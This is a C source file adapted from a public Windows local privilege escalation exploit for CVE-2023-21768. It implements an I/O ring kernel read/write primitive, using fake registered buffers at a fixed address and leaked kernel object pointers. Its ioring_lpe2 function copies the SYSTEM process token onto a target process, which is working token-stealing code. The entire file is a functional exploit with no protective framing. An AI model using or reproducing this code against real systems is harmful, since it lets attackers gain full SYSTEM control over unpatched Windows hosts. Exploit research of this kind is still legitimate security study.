//
// chompie's ioring_lpe.c (https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768/blob/master/Windows_AFD_LPE_CVE-2023-21768/ioring_lpe.c)
// plus a bunch of messy changes for this scenario~
//
#include <windows.h>
#include <ioringapi.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>

#include "ioring.h"
#include "win_defs.h"
#include "nt_offsets.h"

HIORING hIoRing = NULL;
PIORING_OBJECT pIoRing = NULL;
HANDLE hInPipe = INVALID_HANDLE_VALUE;
HANDLE hOutPipe = INVALID_HANDLE_VALUE;
HANDLE hInPipeClient = INVALID_HANDLE_VALUE;
HANDLE hOutPipeClient = INVALID_HANDLE_VALUE;


int ioring_setup(PIORING_OBJECT* ppIoRingAddr)
{
    int ret = -1;
    IORING_CREATE_FLAGS ioRingFlags = { 0 };
    CHAR in_path[0x400] = { 0 };
    CHAR out_path[0x400] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\in_file.bin", in_path, sizeof(in_path));
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\out_file.bin", out_path, sizeof(out_path));

    ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    ioRingFlags.Advisory = IORING_CREATE_REQUIRED_FLAGS_NONE;

    ret = CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x10000, 0x20000, &hIoRing);

    if (0 != ret)
    {
        goto done;
    }

    ret = getobjptr(ppIoRingAddr, GetCurrentProcessId(), *(PHANDLE)hIoRing);

    if (0 != ret)
    {
        goto done;
    }

    pIoRing = *ppIoRingAddr;

    hInPipe = CreateFileA(in_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    hOutPipe = CreateFileA(out_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipe) || (INVALID_HANDLE_VALUE == hOutPipe))
    {
        ret = GetLastError();
        goto done;
    }

    hInPipeClient = CreateFileA(in_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    hOutPipeClient = CreateFileA(out_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if ((INVALID_HANDLE_VALUE == hInPipeClient) || (INVALID_HANDLE_VALUE == hOutPipeClient))
    {
        ret = GetLastError();
        goto done;
    }

    ret = 0;

done:
    return ret;
}

int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)
{
    int ret = -1;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    ULONG ulBytes = 0;
    NTSTATUS ntStatus = STATUS_SUCCESS;

    while ((ntStatus = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (pHandleInfo != NULL)
        {
            pHandleInfo = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
        }

        else
        {
            pHandleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (ntStatus != STATUS_SUCCESS)
    {
        ret = ntStatus;
        goto done;
    }

    for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    {
        if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == handle))
        {
            *ppObjAddr = pHandleInfo->Handles[i].Object;
            ret = 0;
            break;
        }
    }

done:
    if (NULL != pHandleInfo)
    {
        HeapFree(GetProcessHeap(), 0, pHandleInfo);
    }
    return ret;
}
BOOL test = FALSE;
int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)
{
    int ret = -1;
    SetFilePointer(hOutPipeClient, 0, NULL, FILE_BEGIN);
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    FlushFileBuffers(hOutPipeClient);
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);
    
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };

    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        //ret = 0x13371337;
        goto done;
    }

    pMcBufferEntry->Address = pReadAddr;
    pMcBufferEntry->Length = ulReadLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    
    pRegisterBuffers[0] = pMcBufferEntry;
    

    ret = BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, ulReadLen, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        //ret = 0x69;
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        //ret = 0x6969;
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        //ret = 0x696969;
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        //ret = 0x69696969;
        goto done;
    }

    SetFilePointer(hOutPipe, 0, NULL, FILE_BEGIN);
    if (0 == ReadFile(hOutPipe, pReadBuffer, ulReadLen, NULL, NULL))
    {
        ret = GetLastError();
        //ret = 0x1337;
        
        goto done;
    }
    FlushFileBuffers(hOutPipe);

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        //VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
        VirtualFree(pMcBufferEntry, 0, MEM_RELEASE);
    }
    return ret;
}

int ioring_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuffer, ULONG ulWriteLen)
{
    int ret = -1;
    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hInPipeClient);
    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
    IORING_CQE cqe = { 0 };
    CHAR dbg_msg[0x200];


    //sprintf(dbg_msg, "ioring_write: %p %p %i\n", pWriteAddr, pWriteBuffer, ulWriteLen);
    //OutputDebugStringA(dbg_msg);
    //DebugBreak();
    SetFilePointer(hInPipe, 0, NULL, FILE_BEGIN);
    if (0 == WriteFile(hInPipe, pWriteBuffer, ulWriteLen, NULL, NULL))
    {
        ret = GetLastError();
        goto done;
    }
    FlushFileBuffers(hInPipe);
    SetFilePointer(hInPipe, 0, NULL, FILE_BEGIN);

    pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);

    if (NULL == pMcBufferEntry)
    {
        ret = GetLastError();
        goto done;
    }

    pMcBufferEntry->Address = pWriteAddr;
    pMcBufferEntry->Length = ulWriteLen;
    pMcBufferEntry->Type = 0xc02;
    pMcBufferEntry->Size = 0x80;
    pMcBufferEntry->AccessMode = 1;
    pMcBufferEntry->ReferenceCount = 1;

    pRegisterBuffers[0] = pMcBufferEntry;

    SetFilePointer(hInPipeClient, 0, NULL, FILE_BEGIN);
    ret = BuildIoRingReadFile(hIoRing, reqFile, reqBuffer, ulWriteLen, 0, NULL, IOSQE_FLAGS_NONE);

    if (0 != ret)
    {
        goto done;
    }

    ret = SubmitIoRing(hIoRing, 0, 0, NULL);

    if (0 != ret)
    {
        goto done;
    }

    ret = PopIoRingCompletion(hIoRing, &cqe);

    if (0 != ret)
    {
        goto done;
    }

    if (0 != cqe.ResultCode)
    {
        ret = cqe.ResultCode;
        goto done;
    }

    ret = 0;

done:
    if (NULL != pMcBufferEntry)
    {
        //VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
        VirtualFree(pMcBufferEntry, 0, MEM_RELEASE);
    }
    return ret;
}

int map_region()
{
    PVOID pFakeRegBuffers = VirtualAlloc(0x65000000, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    //printf("mapped addr: %p\n", pFakeRegBuffers);

    if (pFakeRegBuffers != (PVOID)0x65000000)
    {
        //printf("failed to map buffer!\n");
        return 0;
    }

    return 1;
}

int race_succeeded(ULONG ulFakeRegBufferCnt, UINT64 ioring_addr)
{
    _HIORING* phIoRing = NULL;

    PVOID pFakeRegBuffers = 0x65007500;


    memset(pFakeRegBuffers, 0, sizeof(ULONG64) * 0x1000);

    phIoRing = *(_HIORING**)&hIoRing;
    phIoRing->RegBufferArray = pFakeRegBuffers;
    phIoRing->BufferArraySize = ulFakeRegBufferCnt;


    BYTE zero_buf[0x20];
    memset(zero_buf, 0, sizeof(zero_buf));

    // quickly fix up the event ptrs
    int ret = ioring_write(pFakeRegBuffers, (ioring_addr + 0x90), &zero_buf, 0x20);

    if (ret != 0)
    {
        return 0;
    }

    return 1;
}

void kwrite(UINT64 addr, PVOID data, SIZE_T size) {
    ioring_write(0x65007500, &pIoRing->RegBuffersCount, data, size);
}

int krnl_write(UINT64 addr, PVOID data, SIZE_T size) {
    return ioring_write(0x65007500, addr, data, size);
}

int krnl_read(UINT64 addr, PVOID buffer, SIZE_T size) {
    return ioring_read(0x65007500, addr, buffer, size);
}

UINT64 ulNtBase;
void ioring_cleanup() {
    if (!ulNtBase)
        return;
    UINT64 orig_val = ulNtBase + get_orig_sd_offset();
    int ret = ioring_write(0x65007500, ulNtBase + get_sd_ptr_offset(), &orig_val, sizeof(orig_val));

    char null[0x10] = { 0 };
    ioring_write(0x65007500, &pIoRing->RegBuffersCount, &null, 0x10);
}

ULONG64 ullSysToken;
ULONG64 systok2;
ULONG64 get_sys_token() {

    return ullSysToken;
}

ULONG64 get_systok2() {
    return systok2;
}

int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCnt, UINT64 ioring_addr, UINT64 nt_base)
{
    int ret = -1;
    HANDLE hProc = NULL;
    ullSystemEPROCaddr = 0;
    ULONG64 ullTargEPROCaddr = 0;
    PVOID pFakeRegBuffers = NULL;
    _HIORING* phIoRing = NULL;
    ullSysToken = 0;
    
    ulNtBase = nt_base;

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);

    if (NULL == hProc)
    {
        ret = GetLastError();
        return ret;
    }

    ret = getobjptr(&ullSystemEPROCaddr, 4, 4);

    if (0 != ret)
    {
        return ret;
    }

    ret = getobjptr(&ullTargEPROCaddr, GetCurrentProcessId(), hProc);

    if (0 != ret)
    {
        return 0;
    }

    pFakeRegBuffers = 0x65007500;


    memset(pFakeRegBuffers, 0, sizeof(ULONG64) * ulFakeRegBufferCnt);

    phIoRing = *(_HIORING**)&hIoRing;
    phIoRing->RegBufferArray = pFakeRegBuffers;
    phIoRing->BufferArraySize = ulFakeRegBufferCnt;


    BYTE zero_buf[0x20];
    memset(zero_buf, 0, sizeof(zero_buf));

    // quickly fix up the event ptrs
    ioring_write(pFakeRegBuffers, (ioring_addr + 0x90), &zero_buf, 0x20);

    ret = ioring_read(pFakeRegBuffers, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));
    
    
    systok2 = 0;
    ULONG64 toktest = 0;
    ioring_read(pFakeRegBuffers, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &systok2, sizeof(ULONG64));
    
    if (0 != ret)
    {
        //wprintf(L"token read failed!\n");
        return 0;
    }
    //systok2 = toktest;

    ret = ioring_write(pFakeRegBuffers, ullTargEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));

    if (0 != ret)
    {
        //  wprintf(L"token write failed\n");
    }

    //UINT64 orig_val = ulNtBase + get_orig_sd_offset();
    //ret = ioring_write(pFakeRegBuffers, ulNtBase + get_sd_ptr_offset(), &orig_val, sizeof(orig_val));
    

    //ioring_cleanup();
    

}
